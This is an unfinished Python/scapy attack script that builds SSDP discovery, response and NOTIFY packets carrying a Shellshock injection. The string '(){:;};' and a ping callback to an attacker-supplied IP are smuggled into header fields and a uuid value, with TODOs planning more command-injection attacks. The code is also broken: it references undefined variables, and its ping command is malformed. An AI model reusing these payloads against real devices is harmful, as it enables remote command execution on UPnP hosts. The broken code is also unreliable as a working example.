#!/bin/python3
from scapy.all import *
import os,sys

############################
# TODO:
#   - Update to use user input options
#   - Add notify and response functionality
#   - Add command injection attacks
#   - Add additional Shellshock attacks
#   - Add debugging output
############################

# Local Variables
#TARGET_IP = '192.168.1.12'
TARGET_IP = sys.argv[1]
ATTACKER_IP = sys.argv[2] # FIXME: have user select interface and get IP and MAC from system
BROADCAST_IP = '239.25.255.250'

# Mode
MODE = 0 # NOTE: 0 is MSEARCH, 1 is RESPONSE, 2 is NOTIFY


# Attacks 
## Shell Commands
ping_cmd = 'ping -c -p ssdp_attack ' + ATTACKER_IP
## Shellshock
shellShock_ping = '(){:;}; ' + ping_cmd

CMD = ping_cmd

# SSDP Search Settings
## Fields
ssdp_SEARCH             = 'M-SEARCH * HTTP/1.1' 
ssdp_SEARCH_HOST        = TARGET_IP + ':1900'
ssdp_SEARCH_MAN         = 'ssdp:discover'
ssdp_SEARCH_MX          = '1'
ssdp_SEARCH_ST          = 'urn:schemas-upnp-org:device:ATTACKER:1'
ssdp_SEARCH_ST_UUID_CMD = 'uuid:' + CMD
ssdp_SEARCH_USER_AGENT  = 'Attacker Host'
## Payloads
payload_SEARCH_NORMAL     = ("%s\r\nHOST:%s\r\nMAN:%s\r\nMX:%s\r\nST:%s\r\nUSER-AGENT:%s\r\n\r\n"%(ssdp_SEARCH,ssdp_SEARCH_HOST,ssdp_SEARCH_MAN,ssdp_SEARCH_MX,ssdp_SEARCH_ST,ssdp_SEARCH_USER_AGENT))
payload_SEARCH_SHELLSHOCK = ("%s\r\nHOST:%s\r\nMAN:%s\r\nMX:%s\r\nST:%s\r\nUSER-AGENT:%s\r\n\r\n"%(ssdp_SEARCH,ssdp_SEARCH_HOST,shellShock,shellShock,shellShock,shellShock))

# SSDP Response Settings
## Fields
ssdp_RESP          = 'HTTP/1.1 200 OK'
ssdp_RESP_CACHE    = 'max-age=120'
ssdp_RESP_DATE     = ''
ssdp_RESP_EXT      = ''
ssdp_RESP_LOC      = ATTACKER_IP + ':1337'
ssdp_RESP_SERVER   = 'Attacker Host'
ssdp_RESP_ST       = 'urn:schemas-upnp-org:device:ATTACKER:1'
ssdp_RESP_USN      = '99999'
ssdp_RESP_SM_ID    = 'c8:0a:a9:16:35:e9' # FIXME: have user select interface and get IP and MAC from system
ssdp_RESP_DEV_TYPE = 'Attacker'
## Payloads
payload_RESP_NORMAL     = ("%s\r\nCACHE-CONTROL:%s\r\nDATE:%s\r\nEXT:%s\r\nLOCATION:%s\r\nSERVER:%s\r\nST:%s\r\nUSN:%s\r\nSM_ID:%s\r\nDEV_TYPE:%s\r\n\r\n"%(ssdp_RESP,ssdp_RESP_CACHE,ssdp_RESP_DATE,ssdp_RESP_EXT,ssdp_RESP_LOC,ssdp_RESP_SERVER,ssdp_RESP_ST,ssdp_RESP_USN,ssdp_RESP_SM_ID,ssdp_RESP_DEV_TYPE))
payload_RESP_SHELLSHOCK = ("%s\r\nCACHE-CONTROL:%s\r\nDATE:%s\r\nEXT:%s\r\nLOCATION:%s\r\nSERVER:%s\r\nST:%s\r\nUSN:%s\r\nSM_ID:%s\r\nDEV_TYPE:%s\r\n\r\n"%(ssdp_RESP,ssdp_RESP_CACHE,ssdp_RESP_DATE,ssdp_RESP_EXT,shellShock,ssdp_RESP_SERVER,shellShock,ssdp_RESP_USN,ssdp_RESP_SM_ID,ssdp_RESP_DEV_TYPE))

# SSDP Notify Settings
## Fields
ssdp_NOTIFY          = 'NOTIFY * HTTP/1.1'
ssdp_NOTIFY_HOST     = BROADCAST_IP + ':1900'
ssdp_NOTIFY_CACHE    = 'max-age=120'
ssdp_NOTIFY_LOC      = ATTACKER_IP + ':1337'
ssdp_NOTIFY_SERVER   = 'Attacker Host'
ssdp_NOTIFY_NT       = 'urn:schemas-upnp-org:device:ATTACKER:1'
ssdp_NOTIFY_NTS      = 'ssdp:alive'
ssdp_NOTIFY_USN      = '99999'
ssdp_NOTIFY_SM_ID    = 'c8:0a:a9:16:35:e9' # FIXME: have user select interface and get IP and MAC from system
ssdp_NOTIFY_DEV_TYPE = 'Attacker'
## Payloads
payload_NOTIFY_NORMAL     = ("%s\r\nHOST:%s\r\nCACHE-CONTROL:%s\r\nDATE:%s\r\nEXT:%s\r\nLOCATION:%s\r\nSERVER:%s\r\nST:%s\r\nUSN:%s\r\nSM_ID:%s\r\nDEV_TYPE:%s\r\n\r\n"%(ssdp_NOTIFY,ssdp_NOTIFY_HOST,ssdp_NOTIFY_CACHE,ssdp_RESP_LOC,ssdp_RESP_SERVER,ssdp_RESP_NT,ssdp_RESP_NTS,ssdp_RESP_USN,ssdp_RESP_SM_ID,ssdp_RESP_DEV_TYPE))
payload_NOTIFY_SHELLSHOCK = ("%s\r\nHOST:%s\r\nCACHE-CONTROL:%s\r\nDATE:%s\r\nEXT:%s\r\nLOCATION:%s\r\nSERVER:%s\r\nST:%s\r\nUSN:%s\r\nSM_ID:%s\r\nDEV_TYPE:%s\r\n\r\n"%(ssdp_NOTIFY,ssdp_NOTIFY_HOST,ssdp_NOTIFY_CACHE,shellShock,ssdp_RESP_SERVER,shellShock,ssdp_RESP_NTS,ssdp_RESP_USN,ssdp_RESP_SM_ID,ssdp_RESP_DEV_TYPE))

payload = payload_NOTIFY_NORMAL

ssdpReq = IP(dst=ssdp_DST)/UDP(sport=ssdp_PORT,dport=ssdp_PORT)/payload
send(ssdpReq)
